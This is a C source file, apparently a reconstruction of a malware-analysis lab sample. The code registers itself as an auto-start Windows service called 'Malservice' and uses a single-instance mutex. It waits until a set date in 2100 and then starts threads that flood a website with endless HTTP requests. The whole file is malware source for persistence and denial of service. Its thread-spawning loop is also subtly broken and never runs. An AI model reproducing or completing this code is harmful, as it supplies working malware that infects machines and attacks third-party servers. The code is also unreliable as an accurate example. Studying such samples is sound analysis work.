#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Advapi32.lib")



void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
DWORD WINAPI DDOS(LPVOID lpParam);

int main(){

	//SERVICE_TABLE_ENTRYA Malservice;
	//Malservice.lpServiceName = "Malservice";
	//Malservice.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)MalserviceMain;

	//StartServiceCtrlDispatcherA(&Malservice);
	//DWORD dw = GetLastError();
	//MalserviceMain(0, NULL);

	SERVICE_TABLE_ENTRY table[] = { { L"Malservice", ServiceMain }, { 0, NULL } };
	StartServiceCtrlDispatcher(table);
	DWORD dw = GetLastError();
	ServiceMain(0, NULL);
	return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv){
	//for debugging
	DWORD error;

	char binaryPathName[1000];
	char Name[] = "HGL345";
	char DisplayName[] = "Malservice";

	SYSTEMTIME systemTime;
	//GetSystemTime(&systemTime);

	//set timer for jan 1st 2100
	systemTime.wYear = 2100;
	systemTime.wMonth = 1; //January
	systemTime.wDayOfWeek = 0; //Sunday??
	systemTime.wDay = 1; //1st
	systemTime.wHour = 5; //not sure why 12am == 5
	systemTime.wMinute = 0;
	systemTime.wSecond = 0;
	systemTime.wMilliseconds = 0;

	FILETIME fileTime;

	//try to obtain mutex
	HANDLE mutexExists = OpenMutexA(MUTEX_ALL_ACCESS/*0x1F0001*/, 0, Name);

	//if mutex already exists then terminate
	if (mutexExists){
		ExitProcess(0);
	}

	//do not check if mutex creation was successful
	CreateMutexA(0, 0, Name);

	HANDLE h = OpenSCManagerA(0, 0, 3);

	//why is this needed?
	GetCurrentProcess();

	//finds path to binary (self)
	GetModuleFileNameA(0, binaryPathName, 0x3E8);

	CreateServiceA(h, DisplayName, DisplayName, 2, 16, 2, 0, binaryPathName, NULL, NULL, NULL, NULL, NULL);
	error = GetLastError();

	//converts System Time to File Time
	SystemTimeToFileTime(&systemTime, &fileTime);
	error = GetLastError(); //error 6 == invalid_handle ?!?!

	HANDLE timer = CreateWaitableTimerA(0, 0, 0);
	error = GetLastError();

	//sets a waitable timer based on fileTime
	SetWaitableTimer(timer, &fileTime, 0, NULL, NULL, FALSE);
	error = GetLastError();

	DWORD d = WaitForSingleObject(timer, INFINITE);
	
	if (!d){
		for (int i = 20; i == 0; i--){
			CreateThread(0, 0, DDOS, 0, 0, 0);
		}
	}

	Sleep(INFINITE);
	return;
}

DWORD WINAPI DDOS(LPVOID lpParam){
	char szAgent[] = "Internet Explorer 8.0";
	char szUrl[] = "http://www.malwareanalysisbook.com";

	HINTERNET i = InternetOpenA(szAgent, 1, 0, 0, 0);

	HINTERNET(*funcptr)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR) = InternetOpenUrlA;

	while (TRUE){
		//might need to use function pointer for createthread to mimic assembly
		//InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0);
		funcptr(i, szUrl, 0, 0, 0x80000000, 0);
	}
	return 0;
}